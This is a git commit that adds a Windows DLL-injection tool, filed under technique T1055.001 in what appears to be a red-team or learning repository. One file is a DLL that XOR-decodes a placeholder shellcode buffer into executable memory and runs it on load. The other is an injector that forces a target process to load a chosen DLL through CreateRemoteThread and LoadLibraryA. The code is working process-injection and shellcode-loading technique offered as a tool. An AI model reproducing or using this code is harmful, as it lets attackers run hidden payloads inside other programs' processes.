a0dc58c966fcd84d32f18f99365e73848d641385
Echo_Slow <73224073+EchoSl0w@users.noreply.github.com>
2023-08-05 17:03:25 +0200

    Added DLL injection
    Created a DLL injector

---
+++ WinAPIs/T1055.001/DLL.cpp
@@ -0,0 +1,48 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h"
+#include "Windows.h"
+
+unsigned char shellcode[] = "xor'ed shellcode"
+
+
+int run()
+{    
+    HANDLE hThread = nullptr;
+
+    char key = 'key';
+    int i = 0;
+    for (i; i < sizeof(shellcode) - 1; i++)
+    {
+        shellcode[i] = shellcode[i] ^ key;
+    }
+
+	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, shellcode, sizeof(shellcode));
+
+    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+    if (!hThread) {
+        return 1;
+    }
+	//((void(*)())exec)();
+
+	return 0;
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        run();
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
---
+++ WinAPIs/T1055.001/Injector.cpp
@@ -0,0 +1,41 @@
+#include <Windows.h>
+#include <stdio.h>
+
+int Error(const char* msg) {
+	printf("%s (%u)\n", msg, GetLastError);
+	return 1;
+}
+
+int main(int argc, char* argv[]) {
+	if (argc < 3) {
+		printf("Usage Injector.exe <PID> <Path to DLL>");
+		return 0;
+	}
+
+	int pid = atoi(argv[1]);
+
+	printf("Obtaining handle to target process");
+	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, 0, pid);
+	if (hProcess == NULL) {
+		Error("Failed in obtaining handle to process");
+	}
+	printf("Allocating memory...\n");
+	void* buffer = VirtualAllocEx(hProcess, NULL, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (buffer == NULL) {
+		Error("Failed in allocating memory");
+	}
+	printf("Writing memory...\n");
+	if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), NULL)) {
+		return Error("Failed in WriteProcessMemory");
+	}
+	printf("Creating remote thread...\n");
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"),
+		buffer, 0, NULL);
+	if (!hThread)
+		return Error("Failed to create thread");
+	printf("SUCCESS!");
+
+	return 0;
+
+}
